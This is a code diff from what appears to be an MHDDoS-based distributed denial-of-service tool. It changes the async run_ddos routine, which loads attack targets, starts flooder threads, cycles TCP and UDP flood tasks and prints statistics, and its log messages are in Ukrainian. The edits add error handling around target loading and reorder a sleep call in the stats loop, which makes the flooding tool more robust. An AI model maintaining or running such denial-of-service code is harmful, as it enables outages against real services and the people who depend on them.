@@ -111,7 +111,6 @@ async def run_ddos(
     flooders = [Flooder(switch_after) for _ in range(total_threads)]
     udp_taskset = None
 
-    # XXX: might throw an exception
     async def load_targets():
         targets, changed = await targets_loader.load()
         targets = await resolve_all_targets(targets)
@@ -138,6 +137,7 @@ async def run_ddos(
             else:
                 raise ValueError(f"Unsupported scheme given: {target.url.scheme}")
         if kwargs_list:
+            # XXX: not gonna work if there are no TCP targets at first
             runnables_iter = cycle(mhddos_async_main(**kwargs) for kwargs in kwargs_list)
             for flooder in flooders:
                 flooder.update_targets(runnables_iter)
@@ -148,7 +148,12 @@ async def run_ddos(
                 udp_taskset.cancel()
             udp_taskset = asyncio.ensure_future(asyncio.gather(*udp_tasks))
 
-    initial_targets, _ = await load_targets()
+    try:
+        initial_targets, _ = await load_targets()
+    except Exception as exc:
+        logger.error(f"{cl.READ}Завнтаження цілей завершилося помилкою: {exc}{cl.RESET}")
+        initial_targets = []
+
     if not initial_targets:
         logger.error(f'{cl.RED}Не вказано жодної цілі для атаки{cl.RESET}')
         exit()
@@ -160,6 +165,7 @@ async def run_ddos(
         refresh_rate = 5
         ts = time.time()
         while True:
+            await asyncio.sleep(refresh_rate)
             try:
                 passed = time.time() - ts
                 ts = time.time()
@@ -175,7 +181,6 @@ async def run_ddos(
                 )
             except Exception:
                 ts = time.time()
-            await asyncio.sleep(refresh_rate)
 
     # setup coroutine to print stats
     tasks.append(asyncio.ensure_future(stats_printer()))
